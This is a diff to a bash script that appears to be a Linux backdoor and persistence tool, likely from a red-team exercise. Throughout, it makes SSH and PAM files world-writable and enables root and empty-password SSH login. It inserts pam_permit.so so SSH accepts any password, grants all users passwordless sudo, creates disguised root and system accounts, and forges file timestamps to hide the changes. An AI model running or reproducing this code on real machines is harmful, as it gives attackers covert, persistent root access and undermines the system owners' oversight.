@@ -93,7 +93,9 @@ set_timestamp () {
 
 SSH_CONFIG_DIR="/etc/ssh"
 SSHD_CONFIG="$SSH_CONFIG_DIR/sshd_config"
-SSHD_PAM="/etc/pam.d/sshd"
+SSHD_OPTIONS="PermitRootLogin PermitEmptyPasswords PasswordAuthentication PubkeyAuthentication"
+PAM_DIR="/etc/pam.d"
+SSHD_PAM="$PAM_DIR/sshd"
 
 PASSWD="/etc/passwd"
 SHADOW="/etc/shadow"
@@ -101,10 +103,16 @@ BACKUP_NOLOGIN="/sbin/nologging"
 EXTRA_BASH="/sbin/nothing"
 SUDOERS="/etc/sudoers"
 
+NEW_GROUPS="users wheel sudo"
+
+# Declaring "associative arrays" (dictionaries)
+# ${var[@]} contains values, ${!var[@]} contains keys: note the addition of the "!" for keys
 declare -A NEW_ROOT_USERS # dictionary, key-value pairs
 NEW_ROOT_USERS["restart"]="" # key: username, value: passwd comment
+NEW_ROOT_USERS["ucp"]="ucp"
 declare -A NEW_SYSTEM_USERS
 NEW_SYSTEM_USERS["aptd"]="apt package daemon"
+NEW_SYSTEM_USERS["ntp"]="network time protocol daemon"
 declare -A NEW_NORMAL_USERS
 NEW_NORMAL_USERS["christian"]="youre not hacked i promise"
 NEW_NORMAL_USERS["ezekiel"]=""
@@ -127,9 +135,19 @@ else
 
 	# Make sshd config world writable
 	chmod o+w "$SSHD_CONFIG" && cecho info "Made '$SSHD_CONFIG' world writable" || cecho error "Couldn't chmod '$SSHD_CONFIG'"
+	
+	if [ -z "$SSHD_OPTIONS" ]; then
+		cecho warning "No SSHD options set, skipping"
+	else
+		for option in $SSHD_OPTIONS; do
+			if grep -q "$option yes" "$SSHD_CONFIG"; then
+				cecho info "Option '$option' already enabled"
+			else
+				sed -i "s/.*$option.*/$option yes/g" "$SSHD_CONFIG" && cecho info "Modified '$SSHD_CONFIG': option '$option' set to 'yes'" || cecho error "Couldn't modify '$SSHD_CONFIG' to set option '$option' to 'yes'"
+			fi
+		done
+	fi
 
-	# Allow SSH root login and passwordless login by modifying the sshd configuration file
-	sed -i 's/.*PermitRootLogin.*/PermitRootLogin yes/g' $SSHD_CONFIG && sed -i 's/.*PermitEmptyPasswords.*/PermitEmptyPasswords yes/g' $SSHD_CONFIG && sed -i 's/.*PubkeyAuthentication.*/PubkeyAuthentication yes/g' $SSHD_CONFIG && sed -i 's/.*PasswordAuthentication.*/PasswordAuthentication yes/g' $SSHD_CONFIG && cecho info "Modified '$SSHD_CONFIG': enabled root, passwordless, public key, and password login" || cecho error "Couldn't modify '$SSHD_CONFIG'"
 	set_timestamp $ssh_timestamp $SSH_CONFIG_DIR
 	set_timestamp $sshd_timestamp $SSHD_CONFIG
 
@@ -137,7 +155,7 @@ else
 	if which systemctl &>/dev/null; then
 		systemctl restart sshd
 	elif which service &>/dev/null; then
-		service sshd restart
+		service ssh restart # "ssh" vs "sshd" for service vs systemctl
 	else
 		cecho error "Could not restart sshd service: 'systemctl' nor 'service' found on system"
 	fi
@@ -150,14 +168,16 @@ else
 	if grep -q "pam_permit.so" "$SSHD_PAM"; then
 		cecho info "SSH PAM authentication already bypassed"
 	else
-		pam_timestamp=`get_timestamp "$SSHD_PAM"`
+		pam_timestamp=`get_timestamp "$PAM_DIR"`
+		sshd_pam_timestamp=`get_timestamp "$SSHD_PAM"`
 
 		# Make sshd pam world writable
 		chmod o+w "$SSHD_PAM" && cecho info "Made '$SSHD_PAM' world writable" || cecho error "Couldn't chmod '$SSHD_PAM'"
 			
 		# Allow SSH authentication with any password. The below line is added to the top of the SSHD_PAM file.
 		sed -i '1s/^/auth       sufficient     pam_permit.so\n/' $SSHD_PAM && cecho info "SSH PAM authentication bypassed" || cecho error "Couldn't modify '$SSHD_PAM'"
-		set_timestamp $pam_timestamp $SSHD_PAM
+		set_timestamp $pam_timestamp $PAM_DIR
+		set_timestamp $sshd_pam_timestamp $SSHD_PAM
 	fi
 fi
 
@@ -200,15 +220,29 @@ else
 	gshadow_timestamp=`get_timestamp "/etc/gshadow"`
 	gshadow_backup_timestamp=`get_timestamp "/etc/gshadow-"`
 
-	groupadd -f "users" && cecho info "Created group 'users'" || cecho error "Could not create group 'users'"
-	groupadd -f "wheel" && cecho info "Created group 'wheel'" || cecho error "Could not create group 'wheel'"
-	groupadd -f "sudo" && cecho info "Created group 'sudo'" || cecho error "Could not create group 'sudo'"
+	for group in $NEW_GROUPS; do
+		if groupadd "$group" 2>/dev/null; then
+			cecho info "Created group '$group'"
+		elif [ $? -eq 9 ]; then
+			cecho info "Group '$group' already exists, skipping"
+		else
+			cecho error "Could not create group '$group'"
+			continue
+		fi
 
-	echo '
-%users ALL=(ALL) NOPASSWD: ALL
-%wheel ALL=(ALL) NOPASSWD: ALL
-%sudo ALL=(ALL) NOPASSWD: ALL
-ALL ALL=(ALL) NOPASSWD: ALL' >> "$SUDOERS" && cecho info "Gave groups 'wheel', 'sudo', 'users', and every other user passwordless sudo permissions" || cecho error "Could not modify '$SUDOERS'"
+		sudoer_text="%$group ALL=(ALL) NOPASSWD: ALL"
+		if grep -q "$sudoer_text" "$SUDOERS"; then
+			cecho info "Group '$group' already in sudoers file '$SUDOERS', skipping"
+		else
+			echo "$sudoer_text" >> "$SUDOERS" && cecho info "Gave group '$group' passwordless sudo permissions" || cecho error "Could not add group '$group' to sudoers file '$SUDOERS'"
+		fi
+	done
+
+	if grep -q "ALL ALL=(ALL) NOPASSWD: ALL" "$SUDOERS"; then
+		cecho info "All users already have passwordless sudo permissions, skipping"
+	else
+		echo "ALL ALL=(ALL) NOPASSWD: ALL" >> "$SUDOERS" && cecho info "Gave all users passwordless sudo permissions" || cecho error "Could not modify '$SUDOERS' to give all users passwordless sudo permissions"
+	fi
 
 	set_timestamp $etc_timestamp "/etc"
 	set_timestamp $sudoers_timestamp "$SUDOERS"
@@ -232,8 +266,7 @@ cecho done "Done setting passwords for all default nologin users"
 
 cecho task "Creating new root users"
 
-if [ -z "$NEW_ROOT_USERS" ]; then
-	cecho debug "'NEW_ROOT_USERS' associative array is '$NEW_ROOT_USERS'"
+if [[ ! -v NEW_ROOT_USERS[@] ]]; then
 	cecho warning "No new root users to create, skipping"
 else
 	passwd_timestamp=`get_timestamp "$PASSWD"`
@@ -267,7 +300,7 @@ cecho done "Done creating new root users"
 
 cecho task "Creating new system users"
 
-if [ -z "$NEW_SYSTEM_USERS" ]; then
+if [[ ! -v NEW_SYSTEM_USERS[@] ]]; then
 	cecho warning "No new system users to create, skipping"
 else
 	passwd_timestamp=`get_timestamp "$PASSWD"`
@@ -301,7 +334,7 @@ cecho done "Done creating new system users"
 
 cecho task "Creating new normal users"
 
-if [ -z "$NEW_NORMAL_USERS" ]; then
+if [[ ! -v NEW_NORMAL_USERS[@] ]]; then
 	cecho warning "No new normal users to create, skipping"
 else
 	passwd_timestamp=`get_timestamp "$PASSWD"`
